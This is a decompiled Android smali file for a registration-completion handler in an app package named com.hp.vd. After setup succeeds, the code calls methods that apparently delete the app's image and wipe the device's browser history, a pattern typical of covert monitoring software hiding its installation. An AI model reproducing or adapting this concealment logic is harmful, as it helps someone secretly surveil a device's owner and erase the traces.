.class Lcom/hp/vd/RegisterActivity$3;
.super Landroid/os/Handler;
.source "RegisterActivity.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/hp/vd/RegisterActivity;->completeInstallationOnClick(Landroid/view/View;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/hp/vd/RegisterActivity;

.field final synthetic val$progressDialog:Landroid/app/ProgressDialog;


# direct methods
.method constructor <init>(Lcom/hp/vd/RegisterActivity;Landroid/app/ProgressDialog;)V
    .locals 0

    .line 522
    iput-object p1, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    iput-object p2, p0, Lcom/hp/vd/RegisterActivity$3;->val$progressDialog:Landroid/app/ProgressDialog;

    invoke-direct {p0}, Landroid/os/Handler;-><init>()V

    return-void
.end method


# virtual methods
.method public handleMessage(Landroid/os/Message;)V
    .locals 5

    .line 525
    iget-object p1, p1, Landroid/os/Message;->obj:Ljava/lang/Object;

    check-cast p1, Ljava/lang/Boolean;

    .line 527
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity$3;->val$progressDialog:Landroid/app/ProgressDialog;

    invoke-virtual {v0}, Landroid/app/ProgressDialog;->dismiss()V

    .line 529
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_0

    .line 539
    new-instance p1, Lcom/hp/vd/AlarmRoutine;

    iget-object v0, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    iget-object v0, v0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    .line 540
    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x0

    new-instance v2, Lcom/hp/vd/agent/Configuration;

    invoke-direct {v2}, Lcom/hp/vd/agent/Configuration;-><init>()V

    invoke-direct {p1, v0, v1, v2}, Lcom/hp/vd/AlarmRoutine;-><init>(Landroid/content/Context;Landroid/content/Intent;Lcom/hp/vd/agent/Configuration;)V

    .line 545
    invoke-virtual {p1}, Lcom/hp/vd/AlarmRoutine;->dispatchOnInstall()V

    .line 554
    :try_start_0
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    invoke-virtual {p1}, Lcom/hp/vd/RegisterActivity;->deleteApplicationImage()V

    .line 555
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    invoke-virtual {p1}, Lcom/hp/vd/RegisterActivity;->deleteBrowserHistory()V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 558
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 565
    :goto_0
    new-instance p1, Landroid/content/Intent;

    iget-object v0, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    const-class v1, Lcom/hp/vd/CompletedActivity;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 566
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    invoke-virtual {v0, p1}, Lcom/hp/vd/RegisterActivity;->startActivity(Landroid/content/Intent;)V

    .line 568
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    invoke-virtual {p1}, Lcom/hp/vd/RegisterActivity;->finish()V

    goto :goto_1

    .line 571
    :cond_0
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    const-string v0, "system.db"

    invoke-virtual {p1, v0}, Lcom/hp/vd/RegisterActivity;->deleteDatabase(Ljava/lang/String;)Z

    .line 577
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    const v0, 0x7f090053

    invoke-virtual {p1, v0}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object p1

    .line 579
    sget-object v0, Lcom/hp/vd/RegisterActivity;->lastError:Ljava/lang/String;

    if-eqz v0, :cond_1

    .line 580
    sget-object p1, Lcom/hp/vd/RegisterActivity;->lastError:Ljava/lang/String;

    .line 588
    :cond_1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " ("

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    iget-object v1, v1, Lcom/hp/vd/RegisterActivity;->editTextEmailFirst:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v1, ")"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 589
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    iget-object v2, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    iget-object v2, v2, Lcom/hp/vd/RegisterActivity;->editTextEmailFirst:Landroid/widget/EditText;

    .line 590
    invoke-virtual {v2}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "on-install"

    const/4 v4, 0x1

    .line 589
    invoke-virtual {v1, v2, v3, v4, v0}, Lcom/hp/vd/RegisterActivity;->sendClientError(Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;)Z

    .line 600
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    iget-object v1, p0, Lcom/hp/vd/RegisterActivity$3;->this$0:Lcom/hp/vd/RegisterActivity;

    const v2, 0x7f090059

    .line 601
    invoke-virtual {v1, v2}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lcom/hp/vd/RegisterActivity$3$1;

    invoke-direct {v2, p0}, Lcom/hp/vd/RegisterActivity$3$1;-><init>(Lcom/hp/vd/RegisterActivity$3;)V

    .line 600
    invoke-virtual {v0, v1, p1, v2}, Lcom/hp/vd/RegisterActivity;->showAlert(Ljava/lang/String;Ljava/lang/String;Landroid/content/DialogInterface$OnClickListener;)V

    :goto_1
    return-void
.end method
